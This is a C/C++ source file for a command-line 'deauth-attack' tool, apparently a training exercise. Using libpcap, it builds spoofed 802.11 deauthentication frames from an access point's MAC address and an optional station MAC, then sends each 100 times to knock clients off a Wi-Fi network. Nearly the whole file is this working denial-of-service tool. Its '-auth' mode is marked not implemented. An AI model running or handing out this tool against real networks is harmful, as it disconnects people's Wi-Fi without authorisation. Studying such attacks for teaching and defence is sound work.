#include <pcap.h>
#include <stdbool.h>
#include <stdio.h>
#include "deauth.h"
#include <string.h>
#include <stdlib.h>
#include <unistd.h>

void hexdump(u_char* packet, unsigned int len){
    puts("[TEST Code]");
    for(unsigned int i = 0; i < len; i++){
        if((i % 0x10) == 0){
            puts("");
        }
        printf("%02hhx ", packet[i]);
    }
    puts("\n");
}

void usage() {
    puts("syntax: deauth-attack <interface> <ap mac> [<station mac>] [-auth]");
    puts("sample: deauth-attack mon0 00:11:22:33:44:55 66:77:88:99:AA:BB");
}

typedef struct {
    char * interface;
    char * ap_mac;
    char * station_mac;
    unsigned int auth_option; // not implemented
    unsigned int flag;
} Param;

Param param  = {
    .interface = NULL,
    .ap_mac = NULL,
    .station_mac = NULL,
    .auth_option = 0,
    .flag = 0
};

bool parse(Param* param, int argc, char* argv[]) {
    if (argc < 3) {
        usage();
        return false;
    }

    switch(argc){
        case 5: // flag 3 // auth
            if(!strncmp(argv[4], "-auth", 5)) // not implemented
                param->auth_option = 1;
            param->flag = -1;
        case 4: // flag 2 // ap-sta, sta-ap
            param->station_mac = argv[3];
        case 3: // flag 1 // ap-broadcast
            param->interface = argv[1];
            param->ap_mac = argv[2];
            param->flag += argc-2;
            break;
        default:
            usage();
            return false;
    }

    return true;
}

int mac2hex(char * str_mac, char mac[6]){

    // int test = strlen(str_mac);
    if(strlen(str_mac) != 17){
        return -1;
    }
    char tmp_mac[18];
    memcpy(tmp_mac, str_mac, 17);
    char *ptr = strtok(tmp_mac, ":");
    int mac_idx = 0;
    char tmp[4] = {0,};
    while(ptr != NULL){
        sprintf(tmp, "0x%s", ptr);
        mac[mac_idx++] = strtol(tmp, NULL, 16);
        ptr = strtok(NULL, ":");
    }
    return 0;
}


int main(int argc, char* argv[]) {
    if (!parse(&param, argc, argv))
        return -1;

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* pcap = pcap_open_live(param.interface, BUFSIZ, 0, 1000, errbuf);
    if (pcap == NULL) {
        fprintf(stderr, "pcap_open_live(%s) return null - %s\n", param.interface, errbuf);
        return -1;
    }

    Deauth * deauth_broad  = new Deauth();
    Deauth * deauth_ap_sta = new Deauth();
    Deauth * deauth_sta_ap = new Deauth();
    if(!param.auth_option){ // deauth attack
        switch(param.flag){
            case 1: // ap-broadcast
                memset(deauth_broad->deauth_packet.dest_addr, 0xff, 6);
                mac2hex(param.ap_mac, (char*)deauth_broad->deauth_packet.src_addr);
                mac2hex(param.ap_mac, (char*)deauth_broad->deauth_packet.BSSID);
                hexdump((u_char *)&deauth_broad->deauth_packet, 0x26); // test
                break;
            case 2: // ap-sta, sta-ap
                // ap-sta
                mac2hex(param.station_mac, (char*)deauth_ap_sta->deauth_packet.dest_addr);
                mac2hex(param.ap_mac, (char*)deauth_ap_sta->deauth_packet.src_addr);
                mac2hex(param.ap_mac, (char*)deauth_ap_sta->deauth_packet.BSSID);
                hexdump((u_char *)&deauth_ap_sta->deauth_packet, 0x26); // test
                // sta-ap
                mac2hex(param.ap_mac, (char*)deauth_sta_ap->deauth_packet.dest_addr);
                mac2hex(param.station_mac, (char*)deauth_sta_ap->deauth_packet.src_addr);
                mac2hex(param.ap_mac, (char*)deauth_sta_ap->deauth_packet.BSSID);
                hexdump((u_char *)&deauth_sta_ap->deauth_packet, 0x26); // test
                break;
        }

        unsigned int loop_count = 0;
        switch(param.flag){
            case 1: // ap-broadcast
                while(loop_count < 100){
                    deauth_broad->send_packet(pcap, (u_char *)&deauth_broad->deauth_packet);
                    loop_count++;
                }
                break;
            case 2: // ap-sta, sta-ap
                while(loop_count < 100){
                    deauth_ap_sta->send_packet(pcap, (u_char *)&deauth_ap_sta->deauth_packet);
                    deauth_sta_ap->send_packet(pcap, (u_char *)&deauth_sta_ap->deauth_packet);
                    loop_count++;
                }
                break;
        }
    }

    pcap_close(pcap);

}
